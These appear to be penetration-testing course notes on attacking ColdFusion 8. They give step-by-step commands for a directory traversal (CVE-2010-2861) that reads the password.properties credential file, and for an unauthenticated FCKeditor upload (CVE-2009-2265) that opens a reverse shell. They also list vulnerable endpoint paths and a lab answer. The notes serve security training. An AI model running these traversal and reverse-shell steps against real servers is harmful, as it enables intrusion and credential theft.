## ID
701

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 24 — Attacking ColdFusion

## Description
Covers two ColdFusion 8 attack paths — directory traversal (CVE-2010-2861) to extract the admin password hash, and unauthenticated RCE via FCKeditor file upload (CVE-2009-2265) to gain a reverse shell.

## Tags
coldfusion, rce, directory-traversal, searchsploit, fckeditor, cve-2009-2265, cve-2010-2861

## Commands
- searchsploit adobe coldfusion
- searchsploit -p 14641
- python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
- searchsploit -p 50057
- cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
- python3 50057.py
- whoami

## What This Section Covers
Two exploit paths against ColdFusion 8: a directory traversal vulnerability (CVE-2010-2861) that leaks the `password.properties` file containing the encrypted admin password, and an unauthenticated RCE (CVE-2009-2265) that abuses the FCKeditor file upload endpoint to upload a JSP payload and establish a reverse shell without any credentials.

## Methodology
1. Search for known exploits: `searchsploit adobe coldfusion` — identify the directory traversal (EDB-14641) and RCE (EDB-50057) entries for ColdFusion 8
2. **Directory Traversal (CVE-2010-2861):** Copy the exploit with `searchsploit -p 14641` and run `python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"` — this exploits vulnerable endpoints like `/CFIDE/wizards/common/_logintowizard.cfm` by manipulating the `locale` parameter to read arbitrary files
3. The exploit dumps `password.properties`, which contains the encrypted admin password hash (SHA1) and the RDS password
4. **Unauthenticated RCE (CVE-2009-2265):** Copy EDB-50057 and edit the script to set `lhost` (attacker VPN IP), `lport` (listener port), `rhost` (target IP), and `rport` (8500)
5. Run `python3 50057.py` — the exploit uploads a JSP payload via the FCKeditor upload endpoint, starts an ncat listener, then triggers execution
6. Once the reverse shell connects, run `whoami` to confirm the running user

## Key Takeaways
- ColdFusion has two distinct attack surfaces here: **information disclosure** (directory traversal) and **code execution** (FCKeditor upload)
- The directory traversal exploits the `locale` parameter in multiple CFIDE admin pages — `mappings.cfm`, `logging/settings.cfm`, `datasources/index.cfm`, `editarchive.cfm`, `enter.cfm`
- `password.properties` lives at `[cf_root]/lib/password.properties` and stores encrypted passwords for database connections, mail servers, LDAP, and other services
- The RCE is **unauthenticated** — it abuses FCKeditor's `upload.cfm` which requires no credentials, making it especially dangerous
- Vulnerable FCKeditor path: `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=`
- Vulnerable ColdFusion code patterns to watch for: `cfexecute` tags executing unsanitized input, `cfdirectory`/`CFFile` without input validation

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What user is ColdFusion running as? | arctic\tolis | Ran `whoami` after reverse shell via 50057.py (CVE-2009-2265) |
